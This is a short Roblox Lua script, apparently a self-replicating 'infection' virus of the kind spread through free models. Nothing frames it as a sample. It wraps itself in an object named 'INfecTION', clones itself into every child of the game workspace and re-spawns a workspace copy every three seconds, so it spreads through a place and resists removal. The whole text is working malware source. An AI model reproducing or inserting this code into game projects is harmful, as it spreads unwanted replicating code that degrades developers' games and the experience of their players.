if script.Parent.className ~= "RotateP" then
	local p = Instance.new("RotateP")
	p.Parent = workspace
	p.Name = "INfecTION"
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild("INfecTION") == nil and list[i].className ~= "RotateP" then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild("inFECtion") == nil then
		local main = script.Parent:Clone()
		main.Name = "inFECtion"
		main.Parent = workspace
	end
	wait(3)
end
